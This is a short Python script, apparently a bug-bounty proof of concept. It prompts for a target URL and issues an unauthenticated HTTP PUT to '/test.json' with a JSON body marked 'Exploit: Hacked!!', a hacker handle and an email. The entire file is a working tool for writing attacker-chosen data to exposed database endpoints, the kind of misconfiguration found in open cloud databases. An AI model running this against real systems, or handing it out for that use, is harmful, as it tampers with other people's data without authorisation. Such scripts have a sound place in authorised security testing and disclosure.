import requests

data = '{"Exploit": "Hacked!!", "Hacker":"bad-alpaca", "Email":"bad-alpaca@wearehackerone.com"}'

url = input("[+]Enter the URL to send the request to: ")
url = url.rstrip('/')
url += '/test.json'

try:
    response = requests.put(url, data=data)
    response.raise_for_status()  # raise an exception if the status code is not 2xx
    print(response.text)
except requests.exceptions.HTTPError as err:
    print(f"HTTP error occurred: {err}")
except requests.exceptions.RequestException as err:
    print(f"An error occurred: {err}")

